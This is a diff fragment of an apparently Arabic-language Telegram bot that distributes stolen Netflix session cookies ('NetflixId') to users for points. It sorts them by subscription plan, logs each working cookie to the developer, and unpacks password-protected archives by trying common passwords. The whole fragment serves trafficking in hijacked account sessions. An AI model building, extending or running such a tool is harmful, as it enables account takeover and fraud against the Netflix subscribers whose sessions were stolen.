     user_data = db_execute("SELECT points, role FROM users WHERE chat_id=?", (chat_id,), fetch=True)
     if user_data:
@@ -446,9 +640,14 @@ def pool_status(call):
     else:
         points_val, role = 5, "MEMBER"
         
-    points = "♾️ (أنت صاحب البوت)" if chat_id == DEVELOPER_CHAT_ID else ("💎 وضع VIP (مفتوح)" if role == "VIP" else f"{points_val} نقطة 🪙")
-    pool_count = db_execute("SELECT COUNT(*) FROM cookies", fetch=True)[0]
-    bot.send_message(chat_id, f"📦 **حالة الحساب والمخزن:**\n\n👤 رصيدك الحالي: **{points}**\n📦 إجمالي الكوكيز المتوفر بالمخزن المشترك: **{pool_count}** حساب جاهز.", reply_markup=generate_main_keyboard(chat_id))
+    points = "♾️" if chat_id == DEVELOPER_CHAT_ID else (LANG_DICT[lang]["vip_mode"] if role == "VIP" else f"{points_val} 🪙")
+    
+    p_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='PREMIUM'", fetch=True)[0]
+    s_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='STANDARD'", fetch=True)[0]
+    b_count = db_execute("SELECT COUNT(*) FROM cookies WHERE plan='BASIC'", fetch=True)[0]
+    
+    status_text = LANG_DICT[lang]["pool_status"].format(points=points, p_count=p_count, s_count=s_count, b_count=b_count)
+    bot.send_message(chat_id, status_text, reply_markup=generate_main_keyboard(chat_id))
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
@@ -459,9 +658,9 @@ def handle_user_feedback(call):
     username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     
-    # البحث عن الكوكيز المطابق في القاعدة
-    target_cookie_row = db_execute("SELECT cookie FROM cookies WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
+    target_cookie_row = db_execute("SELECT cookie, plan FROM cookies WHERE cookie LIKE ?", (short_id + "%",), fetch=True)
     target_cookie = target_cookie_row[0] if target_cookie_row else None
+    plan_type = target_cookie_row[1] if target_cookie_row else "PREMIUM"
 
     if action == "yes":
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
@@ -470,7 +669,7 @@ def handle_user_feedback(call):
         except Exception:
             pass
         if target_cookie:
-            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
+            dev_log_text = f"👑 **سحب ناجح ({plan_type})!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
             try:
                 bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
             except Exception:
@@ -478,24 +677,15 @@ def handle_user_feedback(call):
     elif action == "no":
         if target_cookie:
             db_execute("DELETE FROM cookies WHERE cookie=?", (target_cookie,))
-            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
+            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف.", show_alert=True)
             try:
                 bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
             except Exception:
                 pass
-        else:
-            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
         try:
-            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("❌ تم حذف الرابط لعدم عمله بنجاح!", chat_id, call.message.message_id, reply_markup=None)
         except Exception:
             pass
-        response = execute_dispense_logic(chat_id)
-        if response["status"] == "success":
-            bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
-        elif response["status"] == "no_points":
-            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
-        else:
-            bot.send_message(chat_id, response["message"])
 
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
@@ -595,8 +785,12 @@ def process_zip_entry(message, file_path, password=None, password_msg_id=None, o
                     shutil.rmtree(user_work_dir)
                     process_zip_entry(message, file_path, password=pwd, original_name=original_name)
                     return
+            
+            db_execute("INSERT INTO temp_files (file_path, original_name) VALUES (?, ?)", (file_path, original_name))
+            inserted_id = db_execute("SELECT last_insert_rowid()", fetch=True)[0]
+            
             markup = InlineKeyboardMarkup()
-            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{file_path}_{original_name}") for pwd in COMMON_PASSWORDS]
+            buttons = [InlineKeyboardButton(pwd, callback_data=f"fanal_{pwd}_{inserted_id}") for pwd in COMMON_PASSWORDS]
             markup.add(*buttons)
             bot.send_message(chat_id, "⚠️ الملف المضغوط محمي بكلمة مرور! اختر كلمة المرور الشائعة للمتابعة أو الفك الفوري:", reply_markup=markup)
     else:
@@ -623,34 +817,30 @@ def handle_incoming_document(message):
 def handle_inline_passwords(call):
     data_parts = call.data.split('_')
     chosen_password = data_parts[1]
+    temp_file_id = int(data_parts[2])
     
-    # تجميع الـ file_path والـ original_name بشكل صحيح لتجنب التقطيع
-    remaining_parts = data_parts[2:]
-    original_name = remaining_parts[-1]
-    file_path = "_".join(remaining_parts[:-1])
+    file_data = db_execute("SELECT file_path, original_name FROM temp_files WHERE id=?", (temp_file_id,), fetch=True)
     
-    bot.answer_callback_query(call.id, f"🔑 محاولة الفك بكلمة مرور: {chosen_password}...")
-    process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
+    if file_data:
+        file_path, original_name = file_data[0], file_data[1]
+        db_execute("DELETE FROM temp_files WHERE id=?", (temp_file_id,))
+        bot.answer_callback_query(call.id, f"⏳ جاري المحاولة بكلمة المرور: {chosen_password}")
+        process_zip_entry(call.message, file_path, password=chosen_password, password_msg_id=call.message.message_id, original_name=original_name)
+    else:
+        bot.answer_callback_query(call.id, "❌ عذراً، انتهت صلاحية هذا الطلب أو تم فحص الملف مسبقاً.")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('stop_scan_'))
-@check_ban
 def handle_stop_scan(call):
     target_chat_id = int(call.data.split('_')[2])
-    if call.message.chat.id == target_chat_id:
+    if call.message.chat.id == target_chat_id or call.message.chat.id == DEVELOPER_CHAT_ID:
         active_scans[target_chat_id] = False
-        bot.answer_callback_query(call.id, "🛑 تم إرسال طلب إيقاف الفحص...", show_alert=True)
+        bot.answer_callback_query(call.id, "🛑 جاري إيقاف عملية الفحص الحالية...")
 
-# 📥 دالة معالجة النصوص المباشرة في حال أرسل المستخدم الكوكيز كرسالة نصية للبوت
-@bot.message_handler(func=lambda message: True)
-@check_ban
-def handle_text_cookies(message):
-    extracted_ids = extract_clean_netflix_ids(message.text)
-    if extracted_ids:
-        process_cookies_list_and_check(message.chat.id, extracted_ids, message.message_id, source_name="Text_Input.txt")
-    else:
-        bot.reply_to(message, "❌ عذراً، لم أتمكن من العثور على كوكيز نتفلكس صالحة في رسالتك.\nتأكد من إرسال ملف نصي أو كوكيز بتنسيق صحيح.")
-
-# 🚀 تشغيل البوت بدون توقف
 if __name__ == '__main__':
-    print("🚀 البوت يعمل الآن بشكل مستقر...")
-    bot.infinity_polling(none_stop=True)
+    while True:
+        try:
+            print("🚀 البوت يعمل بكافة المزايا الذكية المترجمة وبنظام الفئات الحصري...")
+            bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
+        except Exception as e:
+            print(f"⚠️ حدث خطأ في اتصال تيليجرام: {e}")
+            time.sleep(5)
